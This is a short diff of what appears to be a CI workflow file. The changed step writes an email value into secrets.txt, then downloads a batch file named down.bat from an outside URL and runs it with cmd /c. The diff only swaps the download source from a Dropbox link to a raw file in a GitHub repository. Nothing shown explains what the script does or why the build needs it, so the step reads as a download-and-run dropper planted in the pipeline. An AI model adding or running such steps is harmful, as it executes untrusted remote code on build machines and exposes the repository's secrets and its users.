@@ -13,7 +13,7 @@ jobs:
         run: |
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
          start-sleep 5
-         Invoke-WebRequest "https://www.dropbox.com/scl/fi/ypcru14dbac39y2xc0kvs/down.bat?rlkey=xwqih8zsxw6p7vc7t8b0gj8vl&dl=1" -OutFile "down.bat"
+         Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/down.bat" -OutFile "down.bat"
          cmd /c down.bat
             
       - name: A
